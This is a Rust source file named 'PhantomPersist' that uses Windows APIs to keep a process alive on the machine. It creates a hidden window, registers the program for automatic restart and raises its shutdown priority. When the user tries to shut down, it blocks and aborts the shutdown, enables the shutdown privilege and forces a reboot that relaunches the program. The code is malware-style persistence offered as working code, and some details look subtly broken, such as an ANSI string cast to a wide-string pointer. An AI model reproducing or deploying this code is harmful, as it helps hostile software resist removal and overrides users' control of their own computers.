use winapi::um::winbase::RegisterApplicationRestart;
use winapi::shared::winerror::FAILED;
use winapi::um::winuser::{WNDCLASSEXA, CreateWindowExA, RegisterClassExA, GetMessageA, TranslateMessage, DispatchMessageA, DefWindowProcA, PostQuitMessage, LoadIconA, LoadCursorA, IDI_APPLICATION, IDC_ARROW, COLOR_WINDOW, CW_USEDEFAULT, WS_OVERLAPPEDWINDOW, WM_QUERYENDSESSION, WM_ENDSESSION, WM_DESTROY, ShutdownBlockReasonCreate, ShutdownBlockReasonDestroy, ExitWindowsEx, EWX_RESTARTAPPS, EWX_FORCE, MSG, CS_HREDRAW, CS_VREDRAW};
use winapi::um::processthreadsapi::{GetCurrentProcess, SetProcessShutdownParameters, OpenProcessToken};
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES, SE_SHUTDOWN_NAME, SE_PRIVILEGE_ENABLED, LUID};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::ntdef::{HANDLE, TRUE, FALSE};
use winapi::shared::windef::HWND;
use winapi::shared::minwindef::{UINT, WPARAM, LPARAM, LRESULT};
use winapi::um::reason::{SHTDN_REASON_MAJOR_OTHER, SHTDN_REASON_MINOR_OTHER};
use winapi::um::winbase::LookupPrivilegeValueA;
use winapi::um::winreg::AbortSystemShutdownA;
use std::ptr;

pub fn register_application_restart() {
    if FAILED(unsafe { RegisterApplicationRestart(ptr::null(), 0) }) {
        println!("Failed to register application restart");
    }
}

unsafe extern "system" fn wnd_proc(hwnd: HWND, msg: UINT, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    match msg {
        WM_QUERYENDSESSION => {
            println!("Shutdown requested. Blocking for now.");
            unsafe { ShutdownBlockReasonCreate(hwnd, "PhantomPersist Shutting down...\0".as_ptr() as *const u16) };
            unsafe { AbortSystemShutdownA(ptr::null_mut()) };

            // Enable SE_SHUTDOWN_NAME privilege
            let mut h_token: HANDLE = ptr::null_mut();
            let mut tkp: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
            
            if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token) } != 0 {
                let mut luid: LUID = unsafe { std::mem::zeroed() };
                if unsafe { LookupPrivilegeValueA(ptr::null_mut(), SE_SHUTDOWN_NAME.as_ptr() as *const i8, &mut luid) } != 0 {
                    tkp.PrivilegeCount = 1;
                    tkp.Privileges[0].Luid = luid;
                    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    unsafe { AdjustTokenPrivileges(h_token, FALSE as i32, &mut tkp, 0, ptr::null_mut(), ptr::null_mut()) };
                }
                unsafe { CloseHandle(h_token) };
            }

            unsafe { ShutdownBlockReasonDestroy(hwnd) };
            if unsafe { ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER) } == 0 {
                println!("Failed to reboot");
            }
            return TRUE as LRESULT;
        }
        WM_ENDSESSION => {
            println!("Shutdown completed.");
            unsafe { ShutdownBlockReasonDestroy(hwnd) };
        }
        WM_DESTROY => {
            unsafe { PostQuitMessage(0) };
        }
        _ => return unsafe { DefWindowProcA(hwnd, msg, wparam, lparam) },
    }
    0
}

pub fn message_loop_thread() {
    unsafe {
        // Create a hidden window
        let window_class = "PhantomPersist_MessageWindow\0";
        let mut wcex: WNDCLASSEXA = std::mem::zeroed();
        wcex.cbSize = std::mem::size_of::<WNDCLASSEXA>() as UINT;
        wcex.style = CS_HREDRAW | CS_VREDRAW;
        wcex.lpfnWndProc = Some(wnd_proc);
        wcex.hInstance = GetModuleHandleA(ptr::null());
        wcex.hIcon = LoadIconA(ptr::null_mut(), IDI_APPLICATION as *const i8);
        wcex.hCursor = LoadCursorA(ptr::null_mut(), IDC_ARROW as *const i8);
        wcex.hbrBackground = (COLOR_WINDOW + 1) as winapi::shared::windef::HBRUSH;
        wcex.lpszClassName = window_class.as_ptr() as *const i8;

        if RegisterClassExA(&wcex) == 0 {
            println!("Failed to register window class.");
            return;
        }

        let hwnd = CreateWindowExA(
            0, // dwExStyle
            window_class.as_ptr() as *const i8,
            "\0".as_ptr() as *const i8,
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            0,
            0,
            ptr::null_mut(),
            ptr::null_mut(),
            GetModuleHandleA(ptr::null()),
            ptr::null_mut(),
        );

        if hwnd.is_null() {
            println!("Failed to create hidden window.");
            return;
        }

        // Set the process shutdown parameters
        if SetProcessShutdownParameters(0x4FF, 0) == 0 {
            if SetProcessShutdownParameters(0x400, 0) == 0 {
                if SetProcessShutdownParameters(0x3FF, 0) == 0 {
                    println!("Failed to set process shutdown parameters.");
                    return;
                }
            }
        }

        // Message loop for the hidden window
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }
}